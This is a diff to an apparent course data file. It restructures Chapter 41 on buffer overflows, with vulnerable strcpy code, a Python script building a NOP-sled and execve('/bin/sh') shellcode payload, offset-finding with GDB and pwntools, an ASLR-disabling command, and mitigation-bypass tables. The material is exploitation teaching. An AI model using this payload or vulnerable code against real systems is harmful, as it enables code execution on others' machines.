@@ -476,385 +476,401 @@ export const CHAPTERS_LEVEL_8: Chapter[] = [
     ]
   },
   {
-    id: 41,
-    slug: 'chapter-41-buffer-overflows-memory-corruption',
-    level: 8,
-    levelTitle: 'Security and Binary Exploitation',
-    title: 'Chapter 41: Buffer Overflows and Memory Corruption',
-    subtitle: 'Stack Smashing, RIP Hijacking, NOP Sleds, and Mitigations (Canaries, NX, ASLR)',
-    learningObjectives: [
-      'Understand the fundamentals of buffer overflow vulnerabilities.',
-      'Understand how buffer overflows overwrite saved stack frames and return addresses.',
-      'Analyze stack layout and identify vulnerable functions.',
-      'Calculate precise payload padding using GDB stack examination.',
-      'Construct a NOP sled to improve shellcode jump reliability.',
-      'Identify modern defensive mitigations: Stack Canaries, NX/DEP, ASLR, and PIE.',
-      'Understand different types of buffer overflows (stack, heap, integer).',
-      'Learn exploit development methodology and best practices.'
+    "id": 41,
+    "slug": "chapter-41-buffer-overflows-memory-corruption",
+    "level": 8,
+    "levelTitle": "Security and Binary Exploitation",
+    "title": "Chapter 41: Buffer Overflows and Memory Corruption",
+    "subtitle": "Stack Smashing, RIP Hijacking, NOP Sleds, and Mitigations (Canaries, NX, ASLR)",
+    "learningObjectives": [
+      "Understand the fundamentals of buffer overflow vulnerabilities.",
+      "Understand how buffer overflows overwrite saved stack frames and return addresses.",
+      "Analyze stack layout and identify vulnerable functions.",
+      "Calculate precise payload padding using GDB stack examination.",
+      "Construct a NOP sled to improve shellcode jump reliability.",
+      "Identify modern defensive mitigations: Stack Canaries, NX/DEP, ASLR, and PIE.",
+      "Understand different types of buffer overflows (stack, heap, integer).",
+      "Learn exploit development methodology and best practices."
     ],
-    prerequisites: ['Chapters 1–40'],
-    keyConcepts: [
-      'Buffer overflow: Writing past the end of a buffer, overwriting adjacent memory.',
-      'Stack smashing: Overwriting saved return address to hijack control flow.',
-      'NOP sled (0x90): Provides a forgiving landing pad for shellcode execution.',
-      'NX/DEP (No-Execute): Prevents execution of code in stack/heap pages.',
-      'Stack canaries: Random values placed before return address to detect overflows.',
-      'ASLR: Randomizes memory layout to prevent predictable addresses.',
-      'PIE (Position-Independent Executable): Randomizes code segment base address.',
-      'ROP (Return-Oriented Programming): Code reuse technique to bypass NX.'
+    "prerequisites": [
+      "Chapters 1–40"
     ],
-    diagramType: 'buffer_overflow',
-    sections: [
+    "keyConcepts": [
+      "Buffer overflow: Writing past the end of a buffer, overwriting adjacent memory.",
+      "Stack smashing: Overwriting saved return address to hijack control flow.",
+      "NOP sled (0x90): Provides a forgiving landing pad for shellcode execution.",
+      "NX/DEP (No-Execute): Prevents execution of code in stack/heap pages.",
+      "Stack canaries: Random values placed before return address to detect overflows.",
+      "ASLR: Randomizes memory layout to prevent predictable addresses.",
+      "PIE (Position-Independent Executable): Randomizes code segment base address.",
+      "ROP (Return-Oriented Programming): Code reuse technique to bypass NX."
+    ],
+    "diagramType": "buffer_overflow",
+    "sections": [
       {
-        id: 'sec-41-1',
-        title: '41.1 Understanding Buffer Overflows',
-        content: `Buffer overflows occur when a program writes more data to a buffer than it can hold, corrupting adjacent memory.
-
-### Types of Buffer Overflows
-| Type | Location | Exploitation |
-|------|----------|--------------|
-| Stack-based | Local variables on stack | Overwrite saved RIP |
-| Heap-based | Dynamic memory (malloc) | Overwrite function pointers |
-| Integer | Arithmetic operations | Cause unexpected allocations |
-| Format string | printf/sprintf | Read/write arbitrary memory |
-| Use-after-free | Freed heap memory | Overwrite freed object |
-
-### Stack Buffer Overflow Anatomy
-
-High Address
-┌─────────────────────┐
-│   Function Args     │
-├─────────────────────┤
-│   Return Address    │ ← Overwritten to shellcode
-├─────────────────────┤
-│   Saved RBP         │ ← Overwritten
-├─────────────────────┤
-│   Local Variables   │ ← Buffer starts here
-│   [Buffer]          │ ← Overflow happens here
-│                     │
-└─────────────────────┘
-Low Address
-
-
-### Why Stack Overflows Occur
-1. No bounds checking on input functions
-2. Trusting user input without validation
-3. Using unsafe C functions (strcpy, gets, sprintf)
-4. Off-by-one errors in loop bounds
-
-### Impact of Buffer Overflows
-• Arbitrary code execution
-• Denial of service
-• Information disclosure
-• Privilege escalation
-• System compromise
-
-### Common Vulnerable Functions
-| Function | Risk | Safer Alternative |
-|----------|------|-------------------|
-| strcpy() | No bounds check | strncpy() |
-| gets() | No bounds at all | fgets() |
-| sprintf() | No format limits | snprintf() |
-| strcat() | No bounds check | strncat() |
-| scanf() | Width not enforced | Use %ns with width |`,
-        codeSnippets: [
+        "id": "sec-41-1",
+        "title": "41.1 Understanding Buffer Overflows",
+        "content": "Buffer overflows occur when a program writes more data to a buffer than it can hold, corrupting adjacent memory."
+      },
+      {
+        "id": "sec-41-1-1",
+        "title": "41.1.1 Types of Buffer Overflows",
+        "content": "",
+        "tableData": {
+          "headers": [
+            "Type",
+            "Location",
+            "Exploitation"
+          ],
+          "rows": [
+            [
+              "Stack-based",
+              "Local variables on stack",
+              "Overwrite saved RIP"
+            ],
+            [
+              "Heap-based",
+              "Dynamic memory (malloc)",
+              "Overwrite function pointers"
+            ],
+            [
+              "Integer",
+              "Arithmetic operations",
+              "Cause unexpected allocations"
+            ],
+            [
+              "Format string",
+              "printf/sprintf",
+              "Read/write arbitrary memory"
+            ],
+            [
+              "Use-after-free",
+              "Freed heap memory",
+              "Overwrite freed object"
+            ]
+          ]
+        }
+      },
+      {
+        "id": "sec-41-1-2",
+        "title": "41.1.2 Stack Buffer Overflow Anatomy",
+        "content": "High Address\n┌─────────────────────┐\n│   Function Args     │\n├─────────────────────┤\n│   Return Address    │ ← Overwritten to shellcode\n├─────────────────────┤\n│   Saved RBP         │ ← Overwritten\n├─────────────────────┤\n│   Local Variables   │ ← Buffer starts here\n│   [Buffer]          │ ← Overflow happens here\n│                     │\n└─────────────────────┘\nLow Address"
+      },
+      {
+        "id": "sec-41-1-3",
+        "title": "41.1.3 Why Stack Overflows Occur",
+        "content": "1. No bounds checking on input functions\n2. Trusting user input without validation\n3. Using unsafe C functions (strcpy, gets, sprintf)\n4. Off-by-one errors in loop bounds"
+      },
+      {
+        "id": "sec-41-1-4",
+        "title": "41.1.4 Impact of Buffer Overflows",
+        "content": "• Arbitrary code execution\n• Denial of service\n• Information disclosure\n• Privilege escalation\n• System compromise"
+      },
+      {
+        "id": "sec-41-1-5",
+        "title": "41.1.5 Common Vulnerable Functions",
+        "content": "",
+        "tableData": {
+          "headers": [
+            "Function",
+            "Risk",
+            "Safer Alternative"
+          ],
+          "rows": [
+            [
+              "strcpy()",
+              "No bounds check",
+              "strncpy()"
+            ],
+            [
+              "gets()",
+              "No bounds at all",
+              "fgets()"
+            ],
+            [
+              "sprintf()",
+              "No format limits",
+              "snprintf()"
+            ],
+            [
+              "strcat()",
+              "No bounds check",
+              "strncat()"
+            ],
+            [
+              "scanf()",
+              "Width not enforced",
+              "Use %ns with width"
+            ]
+          ]
+        }
+      },
+      {
+        "id": "sec-41-1-6",
+        "title": "41.1.6 Code examples",
+        "content": "",
+        "codeSnippets": [
           {
-            language: 'c',
-            title: 'Vulnerable Code Example',
-            code: `#include <stdio.h>
-#include <string.h>
-
-void vulnerable_function(char *input) {
-    char buffer[64];
-    
-    // VULNERABLE: No bounds checking!
-    strcpy(buffer, input);
-    
-    printf("Buffer: %s\\n", buffer);
-}
-
-int main(int argc, char *argv[]) {
-    if (argc > 1) {
-        vulnerable_function(argv[1]);
-    }
-    return 0;
-}`
+            "language": "c",
+            "title": "Vulnerable Code Example",
+            "code": "#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable_function(char *input) {\n    char buffer[64];\n    \n    // VULNERABLE: No bounds checking!\n    strcpy(buffer, input);\n    \n    printf(\"Buffer: %s\\n\", buffer);\n}\n\nint main(int argc, char *argv[]) {\n    if (argc > 1) {\n        vulnerable_function(argv[1]);\n    }\n    return 0;\n}"
           }
         ]
       },
       {
-        id: 'sec-41-2',
-        title: '41.2 Crafting the Stack Exploit Payload',
-        content: `The exploit payload must precisely overflow the buffer to overwrite the return address.
-
-### Payload Structure
-
-[NOP Sled] [Shellcode] [Padding] [Return Address]
-   ↓           ↓           ↓           ↓
- 0x90      Actual code   'A' * N    Address into sled
-
-
-### Calculating the Offset
-1. Use GDB to examine stack layout
-2. Find distance from buffer start to saved RIP
-3. Pattern: Buffer size + alignment + saved RBP = offset to RIP
-
-### NOP Sled Purpose
-• Provides a "landing pad" for imprecise jumps
-• Instead of jumping to exact shellcode address, jump anywhere in sled
-• Each 0x90 byte slides to next instruction
-• Larger sled = easier exploitation but more space needed
-
-### Return Address Calculation
-• Must point into NOP sled (not shellcode)
-• Account for ASLR (if disabled or bypassed)
-• Consider stack alignment (16-byte for x86-64)
-
-### GDB Analysis Commands
-• info frame: Show stack frame layout
-• x/20x $rsp: Examine stack memory
-• pattern_create/pattern_offset: Find exact offset
-• disassemble function: Find vulnerable function
-
-### Exploit Reliability
-• Use NOP sled for variance tolerance
-• Consider heap/stack layout variations
-• Account for environment variables on stack
-• Test with different input sizes`,
-        codeSnippets: [
+        "id": "sec-41-2",
+        "title": "41.2 Crafting the Stack Exploit Payload",
+        "content": "The exploit payload must precisely overflow the buffer to overwrite the return address."
+      },
+      {
+        "id": "sec-41-2-1",
+        "title": "41.2.1 Payload Structure",
+        "content": "[NOP Sled] [Shellcode] [Padding] [Return Address]\n   ↓           ↓           ↓           ↓\n 0x90      Actual code   'A' * N    Address into sled"
+      },
+      {
+        "id": "sec-41-2-2",
+        "title": "41.2.2 Calculating the Offset",
+        "content": "1. Use GDB to examine stack layout\n2. Find distance from buffer start to saved RIP\n3. Pattern: Buffer size + alignment + saved RBP = offset to RIP"
+      },
+      {
+        "id": "sec-41-2-3",
+        "title": "41.2.3 NOP Sled Purpose",
+        "content": "• Provides a \"landing pad\" for imprecise jumps\n• Instead of jumping to exact shellcode address, jump anywhere in sled\n• Each 0x90 byte slides to next instruction\n• Larger sled = easier exploitation but more space needed"
+      },
+      {
+        "id": "sec-41-2-4",
+        "title": "41.2.4 Return Address Calculation",
+        "content": "• Must point into NOP sled (not shellcode)\n• Account for ASLR (if disabled or bypassed)\n• Consider stack alignment (16-byte for x86-64)"
+      },
+      {
+        "id": "sec-41-2-5",
+        "title": "41.2.5 GDB Analysis Commands",
+        "content": "• info frame: Show stack frame layout\n• x/20x $rsp: Examine stack memory\n• pattern_create/pattern_offset: Find exact offset\n• disassemble function: Find vulnerable function"
+      },
+      {
+        "id": "sec-41-2-6",
+        "title": "41.2.6 Exploit Reliability",
+        "content": "• Use NOP sled for variance tolerance\n• Consider heap/stack layout variations\n• Account for environment variables on stack\n• Test with different input sizes"
+      },
+      {
+        "id": "sec-41-2-7",
+        "title": "41.2.7 Code examples",
+        "content": "",
+        "codeSnippets": [
           {
-            language: 'python',
-            title: 'exploit_payload.py',
-            code: `import struct
-import sys
-
-# 24-byte execve("/bin/sh") shellcode
-shellcode = (
-    b"\\x31\\xd2\\x52\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68"
-    b"\\x53\\x48\\x89\\xe7\\x31\\xf6\\x31\\xc0\\xb0\\x3b\\x0f\\x05"
-)
-
-# Payload construction
-offset = 72           # 64-byte buffer + 8-byte saved RBP
-nop_sled = b"\\x90" * 40
-padding = b"A" * (offset - len(nop_sled) - len(shellcode))
-return_addr = struct.pack("<Q", 0x7fffffffe020 + 10)
-
-payload = nop_sled + shellcode + padding + return_addr
-
-print(f"Payload length: {len(payload)} bytes")
-print(f"NOP sled: {len(nop_sled)} bytes")
-print(f"Shellcode: {len(shellcode)} bytes")
-print(f"Padding: {len(padding)} bytes")
-
-# Write to file
-with open("payload.bin", "wb") as f:
-    f.write(payload)
-
-print("Payload written to payload.bin")`
+            "language": "python",
+            "title": "exploit_payload.py",
+            "code": "import struct\nimport sys\n\n# 24-byte execve(\"/bin/sh\") shellcode\nshellcode = (\n    b\"\\x31\\xd2\\x52\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\"\n    b\"\\x53\\x48\\x89\\xe7\\x31\\xf6\\x31\\xc0\\xb0\\x3b\\x0f\\x05\"\n)\n\n# Payload construction\noffset = 72           # 64-byte buffer + 8-byte saved RBP\nnop_sled = b\"\\x90\" * 40\npadding = b\"A\" * (offset - len(nop_sled) - len(shellcode))\nreturn_addr = struct.pack(\"<Q\", 0x7fffffffe020 + 10)\n\npayload = nop_sled + shellcode + padding + return_addr\n\nprint(f\"Payload length: {len(payload)} bytes\")\nprint(f\"NOP sled: {len(nop_sled)} bytes\")\nprint(f\"Shellcode: {len(shellcode)} bytes\")\nprint(f\"Padding: {len(padding)} bytes\")\n\n# Write to file\nwith open(\"payload.bin\", \"wb\") as f:\n    f.write(payload)\n\nprint(\"Payload written to payload.bin\")"
           }
         ]
       },
       {
-        id: 'sec-41-3',
-        title: '41.3 Modern Exploit Mitigations',
-        content: `Modern systems employ multiple layers of defense against buffer overflows.
-
-### Stack Canaries
-• Random value placed before saved return address
-• Checked before function return
-• If corrupted, __stack_chk_fail() terminates program
-• Defeated by: Information leak, brute force, format string
-
-### NX/DEP (No-Execute/Data Execution Prevention)
-• Marks stack and heap as non-executable
-• Prevents execution of injected shellcode
-• Defeated by: ROP, ret2libc, JIT spraying
-
-### ASLR (Address Space Layout Randomization)
-• Randomizes base addresses of:
-  - Stack
-  - Heap
-  - Shared libraries (libc)
-  - Executable (with PIE)
-• Defeated by: Information leak, brute force, partial overwrite
-
-### PIE (Position-Independent Executable)
-• Randomizes code segment base address
-• Combined with ASLR for full randomization
-• Defeated by: Information leak of code addresses
-
-### RELRO (Relocation Read-Only)
-• Makes GOT read-only after dynamic linking
-• Partial RELRO: GOT writable (default)
-• Full RELRO: GOT read-only ( harder to exploit)
-
-### CFI (Control-Flow Integrity)
-• Validates indirect call/jump targets
-• Prevents ROP/JOP attacks
-• Implementation: LLVM CFI, Intel CET
-
-### Mitigation Bypass Techniques
-| Mitigation | Bypass Technique |
-|------------|------------------|
-| NX/DEP | ROP, ret2libc |
-| ASLR | Info leak, brute force |
-| Canaries | Leak canary value |
-| PIE | Leak code address |
-| RELRO | Use data-only attacks |`,
-        codeSnippets: [
+        "id": "sec-41-3",
+        "title": "41.3 Modern Exploit Mitigations",
+        "content": "Modern systems employ multiple layers of defense against buffer overflows."
+      },
+      {
+        "id": "sec-41-3-1",
+        "title": "41.3.1 Stack Canaries",
+        "content": "• Random value placed before saved return address\n• Checked before function return\n• If corrupted, __stack_chk_fail() terminates program\n• Defeated by: Information leak, brute force, format string"
+      },
+      {
+        "id": "sec-41-3-2",
+        "title": "41.3.2 NX/DEP (No-Execute/Data Execution Prevention)",
+        "content": "• Marks stack and heap as non-executable\n• Prevents execution of injected shellcode\n• Defeated by: ROP, ret2libc, JIT spraying"
+      },
+      {
+        "id": "sec-41-3-3",
+        "title": "41.3.3 ASLR (Address Space Layout Randomization)",
+        "content": "• Randomizes base addresses of:\n  - Stack\n  - Heap\n  - Shared libraries (libc)\n  - Executable (with PIE)\n• Defeated by: Information leak, brute force, partial overwrite"
+      },
+      {
+        "id": "sec-41-3-4",
+        "title": "41.3.4 PIE (Position-Independent Executable)",
+        "content": "• Randomizes code segment base address\n• Combined with ASLR for full randomization\n• Defeated by: Information leak of code addresses"
+      },
+      {
+        "id": "sec-41-3-5",
+        "title": "41.3.5 RELRO (Relocation Read-Only)",
+        "content": "• Makes GOT read-only after dynamic linking\n• Partial RELRO: GOT writable (default)\n• Full RELRO: GOT read-only ( harder to exploit)"
+      },
+      {
+        "id": "sec-41-3-6",
+        "title": "41.3.6 CFI (Control-Flow Integrity)",
+        "content": "• Validates indirect call/jump targets\n• Prevents ROP/JOP attacks\n• Implementation: LLVM CFI, Intel CET"
+      },
+      {
+        "id": "sec-41-3-7",
+        "title": "41.3.7 Mitigation Bypass Techniques",
+        "content": "",
+        "tableData": {
+          "headers": [
+            "Mitigation",
+            "Bypass Technique"
+          ],
+          "rows": [
+            [
+              "NX/DEP",
+              "ROP, ret2libc"
+            ],
+            [
+              "ASLR",
+              "Info leak, brute force"
+            ],
+            [
+              "Canaries",
+              "Leak canary value"
+            ],
+            [
+              "PIE",
+              "Leak code address"
+            ],
+            [
+              "RELRO",
+              "Use data-only attacks"
+            ]
+          ]
+        }
+      },
+      {
+        "id": "sec-41-3-8",
+        "title": "41.3.8 Code examples",
+        "content": "",
+        "codeSnippets": [
           {
-            language: 'bash',
-            title: 'Checking Protections',
-            code: `# Check binary protections
-checksec --file=vulnerable_binary
-
-# Or with readelf
-readelf -l vulnerable_binary | grep GNU_STACK
-# NX enabled if no EXEC flag
-
-# Check ASLR status
-cat /proc/sys/kernel/randomize_va_space
-# 0 = disabled, 1 = partial, 2 = full
-
-# Disable ASLR (requires root)
-echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
-
-# Compile with protections
-gcc -o vuln vuln.c -fstack-protector-strong  # Stack canary
-gcc -o vuln vuln.c -z noexecstack            # NX enabled
-gcc -o vuln vuln.c -pie -fPIE                # PIE enabled
-gcc -o vuln vuln.c -z relro -z now           # Full RELRO`
+            "language": "bash",
+            "title": "Checking Protections",
+            "code": "# Check binary protections\nchecksec --file=vulnerable_binary\n\n# Or with readelf\nreadelf -l vulnerable_binary | grep GNU_STACK\n# NX enabled if no EXEC flag\n\n# Check ASLR status\ncat /proc/sys/kernel/randomize_va_space\n# 0 = disabled, 1 = partial, 2 = full\n\n# Disable ASLR (requires root)\necho 0 | sudo tee /proc/sys/kernel/randomize_va_space\n\n# Compile with protections\ngcc -o vuln vuln.c -fstack-protector-strong  # Stack canary\ngcc -o vuln vuln.c -z noexecstack            # NX enabled\ngcc -o vuln vuln.c -pie -fPIE                # PIE enabled\ngcc -o vuln vuln.c -z relro -z now           # Full RELRO"
           }
         ]
       },
       {
-        id: 'sec-41-4',
-        title: '41.4 Exploit Development Methodology',
-        content: `Professional exploit development follows a systematic approach.
-
-### Step-by-Step Methodology
-1. **Identify Vulnerability**: Find buffer overflow in source/binary
-2. **Determine Offset**: Calculate exact distance to return address
-3. **Control EIP/RIP**: Verify you can overwrite return address
-4. **Find Buffer Address**: Locate where shellcode will land
-5. **Craft Payload**: Build exploit with NOP sled + shellcode
-6. **Bypass Mitigations**: Address NX, ASLR, canaries as needed
-7. **Test Exploit**: Verify reliable code execution
-8. **Document**: Record findings and exploitation path
-
-### GDB Workflow
-1. Run program with pattern input
-2. Analyze crash (info registers, backtrace)
-3. Find offset with pattern_create/pattern_offset
-4. Verify control of instruction pointer
-5. Test shellcode execution
-
-### Exploit Reliability Factors
-• Environment variables affect stack layout
-• Input may be modified (encoding, filtering)
-• Network delays (for remote exploits)
-• Anti-debugging measures
-• Multiple architectures/OS versions
-
-### Common Exploit Patterns
-| Scenario | Technique |
-|----------|-----------|
-| Local exploit | Direct stack smash |
-| Remote exploit | Network buffer overflow |
-| Format string | Arbitrary read/write |
-| Heap overflow | Use-after-free |
-| Race condition | TOCTOU exploitation |`,
-        codeSnippets: [
+        "id": "sec-41-4",
+        "title": "41.4 Exploit Development Methodology",
+        "content": "Professional exploit development follows a systematic approach."
+      },
+      {
+        "id": "sec-41-4-1",
+        "title": "41.4.1 Step-by-Step Methodology",
+        "content": "1. Identify Vulnerability: Find buffer overflow in source/binary\n2. Determine Offset: Calculate exact distance to return address\n3. Control EIP/RIP: Verify you can overwrite return address\n4. Find Buffer Address: Locate where shellcode will land\n5. Craft Payload: Build exploit with NOP sled + shellcode\n6. Bypass Mitigations: Address NX, ASLR, canaries as needed\n7. Test Exploit: Verify reliable code execution\n8. Document: Record findings and exploitation path"
+      },
+      {
+        "id": "sec-41-4-2",
+        "title": "41.4.2 GDB Workflow",
+        "content": "1. Run program with pattern input\n2. Analyze crash (info registers, backtrace)\n3. Find offset with pattern_create/pattern_offset\n4. Verify control of instruction pointer\n5. Test shellcode execution"
+      },
+      {
+        "id": "sec-41-4-3",
+        "title": "41.4.3 Exploit Reliability Factors",
+        "content": "• Environment variables affect stack layout\n• Input may be modified (encoding, filtering)\n• Network delays (for remote exploits)\n• Anti-debugging measures\n• Multiple architectures/OS versions"
+      },
+      {
+        "id": "sec-41-4-4",
+        "title": "41.4.4 Common Exploit Patterns",
+        "content": "",
+        "tableData": {
+          "headers": [
+            "Scenario",
+            "Technique"
+          ],
+          "rows": [
+            [
+              "Local exploit",
+              "Direct stack smash"
+            ],
+            [
+              "Remote exploit",
+              "Network buffer overflow"
+            ],
+            [
+              "Format string",
+              "Arbitrary read/write"
+            ],
+            [
+              "Heap overflow",
+              "Use-after-free"
+            ],
+            [
+              "Race condition",
+              "TOCTOU exploitation"
+            ]
+          ]
+        }
+      },
+      {
+        "id": "sec-41-4-5",
+        "title": "41.4.5 Code examples",
+        "content": "",
+        "codeSnippets": [
           {
-            language: 'python',
-            title: 'GDB Pattern Analysis',
-            code: `# Generate pattern
-pattern = b""
-for i in range(200):
-    pattern += bytes([i % 256])
-
-# Find offset in GDB
-# (gdb) pattern create 200
-# (gdb) run
-# (gdb) info eip  # eip = 0x61616161
-# (gdb) pattern offset 0x61616161
-# Found at offset: 72
-
-# Or use pwntools
-from pwn import *
-p = process('./vulnerable')
-payload = cyclic(200)
-p.sendline(payload)
-p.wait()
-eip = p.corefile.eip
-offset = cyclic_find(eip)
-print(f"Offset: {offset}")`
+            "language": "python",
+            "title": "GDB Pattern Analysis",
+            "code": "# Generate pattern\npattern = b\"\"\nfor i in range(200):\n    pattern += bytes([i % 256])\n\n# Find offset in GDB\n# (gdb) pattern create 200\n# (gdb) run\n# (gdb) info eip  # eip = 0x61616161\n# (gdb) pattern offset 0x61616161\n# Found at offset: 72\n\n# Or use pwntools\nfrom pwn import *\np = process('./vulnerable')\npayload = cyclic(200)\np.sendline(payload)\np.wait()\neip = p.corefile.eip\noffset = cyclic_find(eip)\nprint(f\"Offset: {offset}\")"
           }
         ]
       }
     ],
-    exercises: [
+    "exercises": [
       {
-        id: 'ex-41-1',
-        title: 'Exercise 41.1: Stack Canary Detection',
-        description: 'Explain how stack canaries prevent stack smashing exploits.',
-        solution: 'A stack canary is a random integer placed immediately before the saved return address. Before ret, the compiler checks if the canary value matches the master canary in thread-local storage. If overwritten by an overflow, __stack_chk_fail terminates the process.'
+        "id": "ex-41-1",
+        "title": "Exercise 41.1: Stack Canary Detection",
+        "description": "Explain how stack canaries prevent stack smashing exploits.",
+        "solution": "A stack canary is a random integer placed immediately before the saved return address. Before ret, the compiler checks if the canary value matches the master canary in thread-local storage. If overwritten by an overflow, __stack_chk_fail terminates the process."
       },
       {
-        id: 'ex-41-2',
-        title: 'Exercise 41.2: Calculate Buffer Overflow Offset',
-        description: 'Given a 64-byte buffer and saved RBP, calculate the offset to overwrite return address.',
-        solution: 'Offset = buffer size (64) + saved RBP (8) = 72 bytes. After 72 bytes, the next 8 bytes overwrite the return address on x86-64.'
+        "id": "ex-41-2",
+        "title": "Exercise 41.2: Calculate Buffer Overflow Offset",
+        "description": "Given a 64-byte buffer and saved RBP, calculate the offset to overwrite return address.",
+        "solution": "Offset = buffer size (64) + saved RBP (8) = 72 bytes. After 72 bytes, the next 8 bytes overwrite the return address on x86-64."
       },
       {
-        id: 'ex-41-3',
-        title: 'Exercise 41.3: NOP Sled Design',
-        description: 'Design a payload with a 100-byte NOP sled and 24-byte shellcode.',
-        solution: 'Payload: [100 bytes 0x90] [24 bytes shellcode] [padding to offset] [8 bytes return addr]. Return address should point into middle of NOP sled (e.g., sled_start + 50).'
+        "id": "ex-41-3",
+        "title": "Exercise 41.3: NOP Sled Design",
+        "description": "Design a payload with a 100-byte NOP sled and 24-byte shellcode.",
+        "solution": "Payload: [100 bytes 0x90] [24 bytes shellcode] [padding to offset] [8 bytes return addr]. Return address should point into middle of NOP sled (e.g., sled_start + 50)."
       },
       {
-        id: 'ex-41-4',
-        title: 'Exercise 41.4: Bypass NX with ROP',
-        description: 'Explain how Return-Oriented Programming bypasses NX protection.',
-        solution: 'ROP chains together small instruction sequences (gadgets) already present in executable code segments. Since NX only prevents execution from writable memory (stack/heap), and ROP executes from read-only code segments, NX is bypassed without injecting new code.'
+        "id": "ex-41-4",
+        "title": "Exercise 41.4: Bypass NX with ROP",
+        "description": "Explain how Return-Oriented Programming bypasses NX protection.",
+        "solution": "ROP chains together small instruction sequences (gadgets) already present in executable code segments. Since NX only prevents execution from writable memory (stack/heap), and ROP executes from read-only code segments, NX is bypassed without injecting new code."
       }
     ],
-    practiceQuestions: [
+    "practiceQuestions": [
       {
-        question: 'What is the purpose of Address Space Layout Randomization (ASLR)?',
-        answer: 'ASLR randomizes the base memory addresses of the stack, heap, and shared libraries on every execution, preventing attackers from predicting the exact memory addresses needed for jumps or return targets. This makes exploitation significantly harder as the attacker cannot reliably locate shellcode or gadgets.'
+        "question": "What is the purpose of Address Space Layout Randomization (ASLR)?",
+        "answer": "ASLR randomizes the base memory addresses of the stack, heap, and shared libraries on every execution, preventing attackers from predicting the exact memory addresses needed for jumps or return targets. This makes exploitation significantly harder as the attacker cannot reliably locate shellcode or gadgets."
       },
       {
-        question: 'How do stack canaries work and what are their limitations?',
-        answer: 'Stack canaries place a random value before the saved return address. Before returning, the function checks if the canary is intact. If corrupted by an overflow, the program terminates. Limitations: can be brute-forced (single-byte canaries), leaked via information disclosure, or bypassed by overwriting only the canary value if the overflow is precise.'
+        "question": "How do stack canaries work and what are their limitations?",
+        "answer": "Stack canaries place a random value before the saved return address. Before returning, the function checks if the canary is intact. If corrupted by an overflow, the program terminates. Limitations: can be brute-forced (single-byte canaries), leaked via information disclosure, or bypassed by overwriting only the canary value if the overflow is precise."
       },
       {
-        question: 'What is the difference between NX and DEP?',
-        answer: 'NX (No-Execute) is an Intel/AMD CPU feature marking memory pages as non-executable. DEP (Data Execution Prevention) is Microsoft\'s implementation of NX on Windows. Both prevent code execution from data pages (stack, heap), but the terminology differs by platform. They serve the same purpose: preventing injected shellcode execution.'
+        "question": "What is the difference between NX and DEP?",
+        "answer": "NX (No-Execute) is an Intel/AMD CPU feature marking memory pages as non-executable. DEP (Data Execution Prevention) is Microsoft's implementation of NX on Windows. Both prevent code execution from data pages (stack, heap), but the terminology differs by platform. They serve the same purpose: preventing injected shellcode execution."
       },
       {
-        question: 'Why are NOP sleds used in buffer overflow exploits?',
-        answer: 'NOP sleds provide a large "landing pad" (40-100+ bytes of 0x90 instructions) for imprecise jumps. Instead of needing to jump to the exact shellcode address, the attacker jumps anywhere in the sled, which slides execution to the shellcode. This increases exploit reliability when memory addresses vary slightly between runs.'
+        "question": "Why are NOP sleds used in buffer overflow exploits?",
+        "answer": "NOP sleds provide a large \"landing pad\" (40-100+ bytes of 0x90 instructions) for imprecise jumps. Instead of needing to jump to the exact shellcode address, the attacker jumps anywhere in the sled, which slides execution to the shellcode. This increases exploit reliability when memory addresses vary slightly between runs."
       },
       {
-        question: 'What is PIE and how does it differ from ASLR?',
-        answer: 'PIE (Position-Independent Executable) randomizes the base address of the executable code segment itself. ASLR randomizes stack, heap, and library addresses. PIE combined with ASLR provides complete address space randomization. Without PIE, the code segment is always at the same address, simplifying ROP gadget location.'
+        "question": "What is PIE and how does it differ from ASLR?",
+        "answer": "PIE (Position-Independent Executable) randomizes the base address of the executable code segment itself. ASLR randomizes stack, heap, and library addresses. PIE combined with ASLR provides complete address space randomization. Without PIE, the code segment is always at the same address, simplifying ROP gadget location."
       },
       {
-        question: 'How can an attacker bypass NX/DEP protections?',
-        answer: 'NX can be bypassed using code reuse techniques: ROP (chaining existing code gadgets), ret2libc (calling libc functions directly), or JIT spraying. These techniques execute code already present in executable memory segments rather than injecting new code into writable memory.'
+        "question": "How can an attacker bypass NX/DEP protections?",
+        "answer": "NX can be bypassed using code reuse techniques: ROP (chaining existing code gadgets), ret2libc (calling libc functions directly), or JIT spraying. These techniques execute code already present in executable memory segments rather than injecting new code into writable memory."
       }
     ],
-    summary: [
-      'Buffer overflows corrupt adjacent memory by writing past buffer boundaries.',
-      'Stack overflows can overwrite return addresses to hijack control flow.',
-      'NOP sleds provide landing pads for imprecise shellcode jumps.',
-      'Modern defenses: canaries detect overflows, NX prevents code execution.',
-      'ASLR and PIE randomize memory layout to prevent predictable addresses.',
-      'Exploit development requires systematic methodology and GDB analysis.',
-      'ROP bypasses NX by reusing existing code gadgets.',
-      'Understanding mitigations is essential for both offensive and defensive security.'
+    "summary": [
+      "Buffer overflows corrupt adjacent memory by writing past buffer boundaries.",
+      "Stack overflows can overwrite return addresses to hijack control flow.",
+      "NOP sleds provide landing pads for imprecise shellcode jumps.",
+      "Modern defenses: canaries detect overflows, NX prevents code execution.",
+      "ASLR and PIE randomize memory layout to prevent predictable addresses.",
+      "Exploit development requires systematic methodology and GDB analysis.",
+      "ROP bypasses NX by reusing existing code gadgets.",
+      "Understanding mitigations is essential for both offensive and defensive security."
     ]
   },
   {
